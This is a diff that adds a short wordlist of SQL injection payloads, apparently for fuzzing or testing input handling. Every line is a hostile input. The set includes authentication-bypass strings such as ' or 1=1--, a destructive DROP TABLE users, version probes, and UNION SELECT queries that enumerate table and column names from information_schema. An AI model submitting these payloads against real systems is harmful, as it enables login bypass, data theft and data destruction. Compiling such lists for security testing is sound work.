@@ -1,0 +1,16 @@
+1; DROP TABLE users --
+' or 1=1--
+" or 1=1--
+' or '1'='1--
+" or "1"="1--
+' OR '1'='1'--
+" OR "1"="1"--
+' OR 1=1 LIMIT 1--
+" OR 1=1 LIMIT 1--
+1; SELECT @@version--
+' UNION SELECT @@version--
+" UNION SELECT @@version--
+' UNION SELECT table_name FROM information_schema.tables--
+" UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
+" UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
